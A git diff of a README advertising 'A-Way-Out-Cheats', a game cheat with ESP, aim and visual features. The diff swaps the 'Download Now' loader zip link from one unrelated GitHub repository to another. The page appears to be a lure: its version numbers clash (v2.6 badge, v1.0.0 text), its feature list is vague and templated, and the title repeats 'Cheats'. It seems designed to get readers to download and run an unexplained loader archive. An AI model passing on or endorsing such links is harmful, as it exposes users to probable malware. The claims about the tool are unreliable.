@@ -1,158 +1,113 @@
-# 🎮 A Way Out Cheats Cheats
-
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
+[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TeamHelpFortress/Humilok/releases/download/v2.6/loader.v2.6.zip)
 
 Latest Version: v1.0.0 • File Size: ~156 MB
 
----
+🎮 A-Way-Out-Cheats
 
-## 📖 About
+«⚡ A universal project with additional gameplay and visual features»
 
-A Way Out Cheats Cheats is a feature-rich third-party modification project designed to provide a wide range of visual, informational, and gameplay-related customization options for A Way Out Cheats.
+Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
 
-The project focuses on a clean and modern interface, flexible configuration, and an organized menu system that makes available modules easy to configure.
+📖 About
 
-> 🛠️ Designed with customization, usability, and a modular structure in mind.
+A-Way-Out-Cheats is a third-party project featuring a set of additional tools for customizing the game interface, displaying information, and adjusting various parameters.
 
----
+The main focus is on a convenient menu structure, flexible settings, and the ability to enable only the features you need.
 
-## ✨ Features
+«🛠️ A simple interface, flexible configuration, and separate settings for different categories.»
 
-### 👁️ ESP / Information
+✨ Features
 
-A Way Out Cheats Cheats includes an extensive information and visualization system with multiple configurable elements.
+👁️ Information
 
-- 👤 Player ESP
-- ❤️ Health Indicators
-- 📏 Distance Display
-- 🏷️ Player Names
-- 🔲 Configurable ESP Elements
-- 🎨 Custom Visual Settings
-- 📍 Object Information
-- 🔎 Additional Information
-- ⚙️ Individual Visualization Settings
+- Player Information
+- Health Display
+- Distance Indicators
+- Name Display
+- Object Information
+- Additional Details
+- Customizable display elements
+- Separate parameters for different components
 
----
+🎯 Targeting
 
-### 🎯 Aim System
+- Target selection area customization
+- Selection of suitable targets
+- Distance settings
+- Sensitivity adjustment
+- Multiple operating modes
+- Individual hotkeys
+- Flexible parameter configuration
 
-The aim module provides configurable targeting options and personalization settings.
+👀 Visuals
 
-- 🎯 Configurable Aim Area
-- 👤 Target Selection
-- 📏 Distance Settings
-- ⚙️ Targeting Parameters
-- 🎚️ Adjustable Smoothing
-- 🔄 Multiple Operating Modes
-- 🎮 Custom Keybinds
-- 🧩 Flexible Configuration
+- Additional visual elements
+- Color customization
+- Distance information
+- Health display
+- Player names
+- Visibility settings
+- Interface appearance customization
 
----
+🔫 Weapon
 
-### 👀 Visuals
+- Weapon information
+- Main characteristics
+- Additional indicators
+- Customizable display
+- Separate element settings
 
-Customize the way information and additional elements are displayed.
+🧍 Player
 
-- 🖥️ Advanced Visual Settings
-- 🎨 Custom Colors
-- 📦 Configurable Visual Elements
-- 📏 Distance Indicators
-- ❤️ Health Indicators
-- 🏷️ Name Display
-- 🔎 Additional Information
-- ✨ Custom Interface Appearance
-- 👁️ Visibility Settings
+- Basic player information
+- Health status
+- Distance
+- Names
+- Visual indicators
+- Additional details
+- Customizable display settings
 
----
+🛠️ Misc
 
-### 🔫 Weapon
+- Custom hotkeys
+- Settings saving
+- Multiple profiles
+- Quick feature switching
+- Interface customization
+- Additional parameters
+- Information panels
 
-Additional weapon-related information and configurable display options.
+🎨 UI / Menu
 
-- 🔫 Weapon Information
-- 📊 Weapon Statistics
-- 🎯 Additional Indicators
-- ⚙️ Configurable Information Display
-- 📋 Customizable Weapon Elements
+The menu is organized by categories, making it easy to quickly find and adjust the required settings.
 
----
+- 🗂️ Settings divided into categories
+- 🎨 Appearance customization
+- ⌨️ Hotkey support
+- 💾 Settings saving
+- 📥 Configuration loading
+- 🔄 Quick feature enabling and disabling
+- 📊 Information panels
+- ⚡ Quick access to the main settings
 
-### 🧍 Player
+💾 Configuration
 
-A dedicated player information module with multiple configurable visualization options.
+Settings can be saved to separate profiles and switched between depending on the selected configuration.
 
-- 👤 Player Information
-- ❤️ Health Status
-- 📏 Distance
-- 🏷️ Player Names
-- 📍 Visual Indicators
-- 🔎 Additional Information
-- ⚙️ Custom Display Settings
+Available:
 
----
+- 📁 Multiple profiles
+- 💾 Settings saving
+- 📥 Configuration loading
+- 🔄 Quick switching
+- ⚙️ Separate category parameters
+- 📋 Ready-made presets
+- 🗂️ Convenient configuration management
 
-### 🛠️ Miscellaneous
+Example
 
-Additional customization options for the overall experience.
-
-- ⌨️ Custom Hotkeys
-- 💾 Configuration System
-- 📂 Multiple Profiles
-- 🔄 Quick Feature Switching
-- 🖥️ Interface Customization
-- ⚙️ Additional Settings
-- 📊 Information Panels
-- 🎨 Custom UI Options
-
----
-
-## 🎨 UI / Menu
-
-A Way Out Cheats Cheats features a clean and organized menu designed around categories and easily accessible settings.
-
-### 🖥️ Interface Features
-
-- 🗂️ Categorized Settings
-- 🎨 Customizable Appearance
-- ⌨️ Hotkey Support
-- 💾 Configuration Saving
-- 📥 Configuration Loading
-- 🔄 Quick Feature Toggles
-- 📊 Information Panels
-- ⚡ Fast Access to Settings
-- 🧩 Modular Layout
-
-The menu is designed to keep configuration simple while providing a wide range of customization options.
-
----
-
-## 💾 Configuration System
-
-The built-in configuration system allows users to save, load, and manage their preferred settings.
-
-### Supported Options
-
-- 📁 Multiple Configuration Profiles
-- 💾 Save Settings
-- 📥 Load Configurations
-- 🔄 Quickly Switch Between Profiles
-- ⚙️ Individual Settings for Each Category
-- 📋 Preset-Based Configuration
-- 🗂️ Organized Configuration Management
-
-### Example Configuration Structure
-
-`text
 configs/
 ├── default.cfg
 ├── visual.cfg
 ├── player.cfg
 └── custom.cfg
-
----
-
-## 📥 Download
-
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
-
-Latest Version: v1.0.0 • File Size: ~156 MB
